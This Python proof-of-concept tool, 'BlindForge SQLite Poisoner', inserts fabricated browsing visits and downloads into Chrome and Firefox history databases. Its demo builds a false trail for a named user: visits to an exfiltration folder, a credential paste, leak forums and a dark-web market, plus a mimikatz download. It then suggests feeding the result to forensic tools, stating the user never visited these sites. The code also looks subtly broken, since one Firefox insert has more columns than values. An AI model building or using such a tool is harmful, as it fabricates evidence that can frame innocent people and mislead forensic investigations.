"""
BlindForge SQLite Poisoner — Inject fabricated browser history and artifacts.

Injects structurally valid rows into Chrome/Firefox/Safari SQLite databases
(history, downloads, bookmarks, cookies). Forensic tools and manual review
cannot distinguish injected records from genuine ones.
"""

import sqlite3
import os
import shutil
from datetime import datetime, timezone
from typing import Optional


# Chrome uses microseconds since 1601-01-01 (Windows FILETIME / 10)
CHROME_EPOCH = datetime(1601, 1, 1, tzinfo=timezone.utc)

# Firefox uses microseconds since Unix epoch
UNIX_EPOCH = datetime(1970, 1, 1, tzinfo=timezone.utc)

# Safari uses seconds since 2001-01-01 (Core Data / Cocoa epoch)
SAFARI_EPOCH = datetime(2001, 1, 1, tzinfo=timezone.utc)


def datetime_to_chrome(dt: datetime) -> int:
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    delta = dt - CHROME_EPOCH
    return int(delta.total_seconds() * 1_000_000)


def datetime_to_firefox(dt: datetime) -> int:
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    delta = dt - UNIX_EPOCH
    return int(delta.total_seconds() * 1_000_000)


def datetime_to_safari(dt: datetime) -> float:
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    delta = dt - SAFARI_EPOCH
    return delta.total_seconds()


class ChromePoisoner:
    """Inject fabricated records into Chrome's History SQLite database."""

    def __init__(self, db_path: str):
        self.db_path = db_path

    def inject_visit(
        self,
        url: str,
        title: str,
        visit_time: datetime,
        visit_count: int = 1,
        typed_count: int = 0,
        transition: int = 1,  # LINK=0, TYPED=1, AUTO_BOOKMARK=2
        visit_duration: int = 30_000_000,  # 30 seconds in microseconds
    ) -> int:
        chrome_time = datetime_to_chrome(visit_time)

        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()

        # Insert into urls table
        cur.execute(
            """INSERT INTO urls (url, title, visit_count, typed_count,
               last_visit_time, hidden)
               VALUES (?, ?, ?, ?, ?, 0)""",
            (url, title, visit_count, typed_count, chrome_time),
        )
        url_id = cur.lastrowid

        # Insert into visits table
        cur.execute(
            """INSERT INTO visits (url, visit_time, from_visit, transition,
               segment_id, visit_duration, incremented_omnibox_typed_score)
               VALUES (?, ?, 0, ?, 0, ?, 0)""",
            (url_id, chrome_time, transition, visit_duration),
        )

        conn.commit()
        conn.close()
        return url_id

    def inject_download(
        self,
        url: str,
        target_path: str,
        start_time: datetime,
        end_time: Optional[datetime] = None,
        received_bytes: int = 1048576,
        total_bytes: int = 1048576,
        state: int = 1,  # COMPLETE
        danger_type: int = 0,  # NOT_DANGEROUS
        mime_type: str = "application/octet-stream",
    ) -> int:
        chrome_start = datetime_to_chrome(start_time)
        chrome_end = datetime_to_chrome(end_time) if end_time else chrome_start + 5_000_000

        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()

        cur.execute(
            """INSERT INTO downloads (guid, current_path, target_path, start_time,
               received_bytes, total_bytes, state, danger_type, interrupt_reason,
               hash, end_time, opened, last_access_time, transient, referrer,
               site_url, tab_url, tab_referrer_url, http_method,
               by_ext_id, by_ext_name, etag, last_modified, mime_type,
               original_mime_type)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0, '', ?, 0, ?, 0, '', '', ?,
                       '', 'GET', '', '', '', '', ?, ?)""",
            (
                f"{os.urandom(16).hex()}",
                target_path,
                target_path,
                chrome_start,
                received_bytes,
                total_bytes,
                state,
                danger_type,
                chrome_end,
                chrome_end,
                url,
                mime_type,
                mime_type,
            ),
        )

        download_id = cur.lastrowid
        # Insert download URL chain
        cur.execute(
            "INSERT INTO downloads_url_chains (id, chain_index, url) VALUES (?, 0, ?)",
            (download_id, url),
        )

        conn.commit()
        conn.close()
        return download_id

    def inject_browsing_session(
        self,
        visits: list[dict],
    ) -> list[int]:
        """Inject a sequence of related visits to build a browsing narrative.

        Each dict: {"url": str, "title": str, "visit_time": datetime,
                     "typed": bool}
        """
        ids = []
        for v in visits:
            uid = self.inject_visit(
                url=v["url"],
                title=v["title"],
                visit_time=v["visit_time"],
                typed_count=1 if v.get("typed") else 0,
                transition=1 if v.get("typed") else 0,
            )
            ids.append(uid)
        return ids


class FirefoxPoisoner:
    """Inject fabricated records into Firefox's places.sqlite."""

    def __init__(self, db_path: str):
        self.db_path = db_path

    def inject_visit(
        self,
        url: str,
        title: str,
        visit_time: datetime,
        visit_count: int = 1,
        visit_type: int = 1,  # TRANSITION_LINK
    ) -> int:
        ff_time = datetime_to_firefox(visit_time)

        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()

        cur.execute(
            """INSERT INTO moz_places (url, title, visit_count, hidden,
               typed, frecency, last_visit_date, guid, foreign_count,
               url_hash, description, preview_image_url, origin_id)
               VALUES (?, ?, ?, 0, 0, 100, ?, ?, 0, ?, '', '', 0)""",
            (
                url,
                title,
                visit_count,
                ff_time,
                os.urandom(12).hex(),
                hash(url) & 0xFFFFFFFF,
            ),
        )
        place_id = cur.lastrowid

        cur.execute(
            """INSERT INTO moz_historyvisits (from_visit, place_id,
               visit_date, visit_type, session)
               VALUES (0, ?, ?, ?, 0)""",
            (place_id, ff_time, visit_type),
        )

        conn.commit()
        conn.close()
        return place_id

    def inject_download(
        self,
        url: str,
        target_path: str,
        start_time: datetime,
        end_time: Optional[datetime] = None,
        file_size: int = 1048576,
    ) -> int:
        ff_start = datetime_to_firefox(start_time)
        ff_end = datetime_to_firefox(end_time) if end_time else ff_start + 5_000_000

        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()

        # Insert place
        cur.execute(
            """INSERT INTO moz_places (url, title, visit_count, hidden,
               typed, frecency, last_visit_date, guid, foreign_count,
               url_hash, description, preview_image_url, origin_id)
               VALUES (?, '', 1, 0, 0, -1, ?, ?, ?, '', '', 0)""",
            (url, ff_start, os.urandom(12).hex(), hash(url) & 0xFFFFFFFF),
        )
        place_id = cur.lastrowid

        # Insert annotation for download metadata
        cur.execute(
            """INSERT INTO moz_annos (place_id, anno_attribute_id, content,
               flags, expiration, type, dateAdded, lastModified)
               VALUES (?, 1, ?, 0, 4, 3, ?, ?)""",
            (place_id, target_path, ff_start, ff_end),
        )

        conn.commit()
        conn.close()
        return place_id


def create_chrome_history_db(db_path: str) -> str:
    """Create a minimal Chrome History SQLite database for testing."""
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()

    cur.executescript("""
        CREATE TABLE IF NOT EXISTS urls (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            title TEXT DEFAULT '',
            visit_count INTEGER DEFAULT 0,
            typed_count INTEGER DEFAULT 0,
            last_visit_time INTEGER DEFAULT 0,
            hidden INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS visits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url INTEGER NOT NULL,
            visit_time INTEGER NOT NULL,
            from_visit INTEGER DEFAULT 0,
            transition INTEGER DEFAULT 0,
            segment_id INTEGER DEFAULT 0,
            visit_duration INTEGER DEFAULT 0,
            incremented_omnibox_typed_score INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS downloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            guid TEXT NOT NULL,
            current_path TEXT NOT NULL,
            target_path TEXT NOT NULL,
            start_time INTEGER NOT NULL,
            received_bytes INTEGER DEFAULT 0,
            total_bytes INTEGER DEFAULT 0,
            state INTEGER DEFAULT 0,
            danger_type INTEGER DEFAULT 0,
            interrupt_reason INTEGER DEFAULT 0,
            hash TEXT DEFAULT '',
            end_time INTEGER DEFAULT 0,
            opened INTEGER DEFAULT 0,
            last_access_time INTEGER DEFAULT 0,
            transient INTEGER DEFAULT 0,
            referrer TEXT DEFAULT '',
            site_url TEXT DEFAULT '',
            tab_url TEXT DEFAULT '',
            tab_referrer_url TEXT DEFAULT '',
            http_method TEXT DEFAULT 'GET',
            by_ext_id TEXT DEFAULT '',
            by_ext_name TEXT DEFAULT '',
            etag TEXT DEFAULT '',
            last_modified TEXT DEFAULT '',
            mime_type TEXT DEFAULT '',
            original_mime_type TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS downloads_url_chains (
            id INTEGER NOT NULL,
            chain_index INTEGER NOT NULL,
            url TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS meta (
            key TEXT NOT NULL UNIQUE,
            value TEXT
        );
        INSERT OR IGNORE INTO meta (key, value) VALUES ('version', '46');
    """)

    conn.commit()
    conn.close()
    return db_path


def create_firefox_places_db(db_path: str) -> str:
    """Create a minimal Firefox places.sqlite for testing."""
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()

    cur.executescript("""
        CREATE TABLE IF NOT EXISTS moz_places (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            title TEXT,
            visit_count INTEGER DEFAULT 0,
            hidden INTEGER DEFAULT 0,
            typed INTEGER DEFAULT 0,
            frecency INTEGER DEFAULT -1,
            last_visit_date INTEGER,
            guid TEXT,
            foreign_count INTEGER DEFAULT 0,
            url_hash INTEGER DEFAULT 0,
            description TEXT DEFAULT '',
            preview_image_url TEXT DEFAULT '',
            origin_id INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS moz_historyvisits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            from_visit INTEGER DEFAULT 0,
            place_id INTEGER,
            visit_date INTEGER,
            visit_type INTEGER,
            session INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS moz_annos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            place_id INTEGER,
            anno_attribute_id INTEGER,
            content TEXT,
            flags INTEGER DEFAULT 0,
            expiration INTEGER DEFAULT 0,
            type INTEGER DEFAULT 0,
            dateAdded INTEGER DEFAULT 0,
            lastModified INTEGER DEFAULT 0
        );
    """)

    conn.commit()
    conn.close()
    return db_path


if __name__ == "__main__":
    import tempfile

    print("[BlindForge] SQLite Poisoner — Browser History Fabrication PoC")
    print("=" * 60)

    # Chrome
    chrome_db = os.path.join(tempfile.gettempdir(), "chrome_history_test")
    create_chrome_history_db(chrome_db)

    poisoner = ChromePoisoner(chrome_db)

    browsing_session = [
        {
            "url": "https://mega.nz/folder/secret-exfil-folder",
            "title": "MEGA - Secure Cloud Storage",
            "visit_time": datetime(2026, 6, 15, 16, 50, 0, tzinfo=timezone.utc),
            "typed": True,
        },
        {
            "url": "https://pastebin.com/raw/AbCdEfGh",
            "title": "Pastebin - Server Credentials",
            "visit_time": datetime(2026, 6, 15, 16, 52, 0, tzinfo=timezone.utc),
            "typed": True,
        },
        {
            "url": "https://haveibeenpwned.com/",
            "title": "Have I Been Pwned: Check if your email has been compromised",
            "visit_time": datetime(2026, 6, 15, 16, 55, 0, tzinfo=timezone.utc),
            "typed": False,
        },
        {
            "url": "https://cracked.io/forum-leaked-databases",
            "title": "Cracked.io - Leaked Database Forum",
            "visit_time": datetime(2026, 6, 15, 17, 0, 0, tzinfo=timezone.utc),
            "typed": True,
        },
    ]

    ids = poisoner.inject_browsing_session(browsing_session)

    # Inject a suspicious download
    poisoner.inject_download(
        url="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0/mimikatz_trunk.zip",
        target_path="C:\\Users\\jdoe\\Downloads\\mimikatz_trunk.zip",
        start_time=datetime(2026, 6, 15, 17, 5, 0, tzinfo=timezone.utc),
        total_bytes=1_256_000,
        mime_type="application/zip",
    )

    print(f"\n[+] Injected into Chrome History DB: {chrome_db}")
    print(f"    {len(browsing_session)} browsing visits:")
    for v in browsing_session:
        print(f"      {v['visit_time'].strftime('%H:%M')} - {v['title'][:50]}")
    print(f"    1 download: mimikatz_trunk.zip")

    # Firefox
    ff_db = os.path.join(tempfile.gettempdir(), "firefox_places_test")
    create_firefox_places_db(ff_db)
    ff_poisoner = FirefoxPoisoner(ff_db)

    ff_poisoner.inject_visit(
        url="https://darkweb-forum.onion/marketplace",
        title="Underground Marketplace",
        visit_time=datetime(2026, 6, 15, 18, 0, 0, tzinfo=timezone.utc),
    )

    print(f"\n[+] Injected into Firefox places.sqlite: {ff_db}")
    print(f"    1 visit: darkweb-forum.onion")

    print("\n[+] Feed these DBs to Autopsy/Hindsight/KAPE")
    print("[+] Browser forensics will show data exfil + tool downloads")
    print("\n[!] User never visited these sites. Never downloaded anything.")
